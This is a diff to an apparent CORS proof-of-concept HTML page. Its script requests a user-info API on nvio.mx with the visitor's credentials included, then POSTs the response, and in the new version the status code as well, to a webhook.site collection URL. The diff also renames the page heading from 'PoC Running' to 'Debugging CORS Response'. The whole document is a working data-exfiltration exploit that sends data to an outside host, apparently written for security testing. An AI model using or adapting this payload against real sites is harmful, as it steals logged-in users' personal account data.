@@ -3,14 +3,15 @@
   <body>
     <script>
       fetch("https://nvio.mx/api/userinfo", { credentials: "include" })
-        .then(res => res.text())
-        .then(data => {
-          fetch("https://webhook.site/35a80643-dbbd-426f-9b3d-5b9c7c924991", {
-            method: "POST",
-            body: data
-          });
-        });
+        .then(res =>
+          res.text().then(data => {
+            fetch("https://webhook.site/35a80643-dbbd-426f-9b3d-5b9c7c924991", {
+              method: "POST",
+              body: "Status: " + res.status + "\n\n" + data
+            });
+          })
+        );
     </script>
-    <h1>CORS PoC Running...</h1>
+    <h1>Debugging CORS Response...</h1>
   </body>
 </html>
